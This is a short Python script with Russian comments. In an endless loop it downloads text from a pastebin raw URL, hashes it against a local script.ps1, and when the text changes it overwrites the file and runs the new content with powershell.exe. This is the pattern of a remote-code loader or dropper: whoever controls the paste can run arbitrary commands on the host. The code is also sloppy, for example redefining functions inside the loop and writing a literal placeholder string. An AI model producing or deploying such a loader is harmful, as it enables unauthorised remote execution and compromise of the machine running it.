import subprocess
from bs4 import BeautifulSoup
import urllib
from urllib import request
import hashlib
import os


    # URL сайта со скриптом
url = "https://pastebin.com/raw/dS7fX2pa"

while True:

# Функция для получения содержимого скрипта
    def get_script_content(url):
        response = urllib.request.urlopen(url)
        soup = BeautifulSoup(response, 'html.parser')
        return str(soup)


# Функция для хеширования содержимого скрипта
    def hash_script_content(script_content):
        return hashlib.md5(script_content.encode()).hexdigest()
        
# Сначала проверяем наличие файла "script.ps1"
    if not os.path.exists('script.ps1'):
        with open('script.ps1', 'w') as file:
            file.write("get_script_content(url)")  # Создаем файл, если он не существует

# Далее читаем содержимое файла
    with open('script.ps1', 'r') as file:
        local_script_content = file.read()

# Получаем содержимое и хеш скрипта на сайте 
    script_content = get_script_content(url)
    script_hash = hash_script_content(script_content)
    local_script_hash = hash_script_content(local_script_content)
    
# Если скрипт на сайте изменился, обновляем локальный скрипт
    if script_hash != local_script_hash:
        with open('script.ps1', 'w') as file:
            file.write(script_content)
        subprocess.call(['powershell.exe', script_content])
